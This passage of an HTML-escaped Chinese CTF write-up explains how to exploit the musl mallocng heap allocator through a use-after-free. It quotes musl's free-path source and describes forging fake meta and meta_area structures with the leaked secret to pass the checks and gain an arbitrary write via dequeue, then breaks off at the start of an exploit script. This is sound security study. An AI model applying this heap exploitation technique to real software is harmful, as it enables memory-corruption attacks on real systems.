class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!MT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		g-&amp;gt;freed_mask = freed+self;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (a_cas(&amp;amp;g-&amp;gt;freed_mask, freed, freed+self)!=freed)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面提到的根据用户指针找到对应的 meta，在 free 函数里被封装在 get_meta () 函数里，这里也是我们的第一个检查。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta *&lt;span class=&#34;title function_&#34;&gt;get_meta&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(!((&lt;span class=&#34;type&#34;&gt;uintptr_t&lt;/span&gt;)p &amp;amp; &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; offset = *(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; *)(p - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; index = get_slot_index(p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (p[&lt;span class=&#34;number&#34;&gt;-4&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert(!offset);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		offset = *(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; *)(p - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert(offset &amp;gt; &lt;span class=&#34;number&#34;&gt;0xffff&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;group&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;base&lt;/span&gt; =&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)(p - UNIT*offset - UNIT);						&lt;span class=&#34;comment&#34;&gt;//UNIT = 16&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;meta&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;meta&lt;/span&gt; =&lt;/span&gt; base-&amp;gt;meta;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(meta-&amp;gt;mem == base);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(index &amp;lt;= meta-&amp;gt;last_idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(!(meta-&amp;gt;avail_mask &amp;amp; (&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;&amp;lt;&amp;lt;index)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(!(meta-&amp;gt;freed_mask &amp;amp; (&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;&amp;lt;&amp;lt;index)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;meta_area&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;area&lt;/span&gt; =&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)((&lt;span class=&#34;type&#34;&gt;uintptr_t&lt;/span&gt;)meta &amp;amp; &lt;span class=&#34;number&#34;&gt;-4096&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(area-&amp;gt;check == ctx.secret);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (meta-&amp;gt;sizeclass &amp;lt; &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert(offset &amp;gt;= size_classes[meta-&amp;gt;sizeclass]*index);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert(offset &amp;lt; size_classes[meta-&amp;gt;sizeclass]*(index+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert(meta-&amp;gt;sizeclass == &lt;span class=&#34;number&#34;&gt;63&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (meta-&amp;gt;maplen) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert(offset &amp;lt;= meta-&amp;gt;maplen*&lt;span class=&#34;number&#34;&gt;4096UL&lt;/span&gt;/UNIT - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta *)meta;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一些 offset，idx 的设置其实有相关的计算方式，但是为了方便，我们伪造的之前，可以把利用程序做一个真实的对布局，然后直接把 group，meta 的结构体中的使用位的参数复制出来。这样就可以很方便的跳过检查。我们将 fake 伪造在一个大的堆块上，fake 会根据 const struct meta *meta = base-&amp;gt;meta; 来查询到，下面我们还要伪造一个 meta_area 结构体，这个结构体保留了__malloc_context 的 secret，然后这个 area 是 0x1000 字节对齐的，const struct meta_area *area = (void *)((uintptr_t) meta &amp;amp; -4096);，这个跟我们的 fake_meta 的地址是相关联的，所以我们需要在一个 0x1000 字节对齐的地方布置一个 fake_meta_area, 主要就是把 secret 写进去，绕过检查。这里并不会检查 meta 的 prev 以及 next 是否合法，所以这里有一个任意地址的写。把 prev 地址 + 8 写为 next 的值。释放 slot 的检查基本就结束，因为我们伪造的 slot 的头，以及 fake_meta 都是真实的样子，然后还有一个关键的检查是在 dequeue (unlink) 之后 free_group，这里会将 group 指针作为一个 slot 指针，进行 free。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; mapinfo &lt;span class=&#34;title function_&#34;&gt;nontrivial_free&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta *g, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; self = &lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;&amp;lt;&amp;lt;i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; sc = g-&amp;gt;sizeclass;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; mask = g-&amp;gt;freed_mask | g-&amp;gt;avail_mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (mask+self == (&lt;span class=&#34;number&#34;&gt;2u&lt;/span&gt;&amp;lt;&amp;lt;g-&amp;gt;last_idx)&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; &amp;amp;&amp;amp; okay_to_free(g)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// any multi-slot group is necessarily on an active list&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// here, but single-slot groups might or might not be.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (g-&amp;gt;next) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			assert(sc &amp;lt; &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; activate_new = (ctx.active[sc]==g);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			dequeue(&amp;amp;ctx.active[sc], g);					&lt;span class=&#34;comment&#34;&gt;//任意地址写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (activate_new &amp;amp;&amp;amp; ctx.active[sc])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				activate_group(ctx.active[sc]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; free_group(g);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!mask) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert(sc &amp;lt; &lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// might still be active if there were no allocations&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// after last available slot was taken.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (ctx.active[sc] != g) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;(&amp;amp;ctx.active[sc], g);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dequeue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta **phead, &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta *m)&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;//unlink the meta&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (m-&amp;gt;next != m) &amp;#123;							&lt;span class=&#34;comment&#34;&gt;//meta is freed&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		m-&amp;gt;prev-&amp;gt;next = m-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		m-&amp;gt;next-&amp;gt;prev = m-&amp;gt;prev;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (*phead == m) *phead = m-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		*phead = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	m-&amp;gt;prev = m-&amp;gt;next = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;就是我们上面图片的 3 号位置。这个是 group 对应的 meta, 这里利用同样的手段伪造一个 fake_meta_area 以及一个 meta, 只需要在另外一个 0x1000 字节对齐的空间布置下 secret，后面布置 fake_meta2 就可以了。因为这里的检查也主要是 get_meta (). 最后 free_meta ()&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free_meta&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta *m)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	*m = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta)&amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;(&amp;amp;ctx.free_meta_head, m);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta **phead, &lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; meta *m)&lt;/span&gt;						&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//inser m in the front of queue,but it will not change the phead ptr &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(!m-&amp;gt;next);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	assert(!m-&amp;gt;prev);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (*phead) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;meta&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;head&lt;/span&gt; =&lt;/span&gt; *phead;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		m-&amp;gt;next = head;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		m-&amp;gt;prev = head-&amp;gt;prev;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		m-&amp;gt;next-&amp;gt;prev = m-&amp;gt;prev-&amp;gt;next = m;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		m-&amp;gt;prev = m-&amp;gt;next = m;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		*phead = m;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;没有什么其他检查。&lt;/p&gt;
&lt;h4 id=&#34;利用-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用-2&#34;&gt;#&lt;/a&gt; 利用&lt;/h4&gt;
&lt;p&gt;回到题目，我们利用 UAF,&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;g&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;g&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;h&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;h&amp;#x27;&lt;/span&gt;*&lt;span 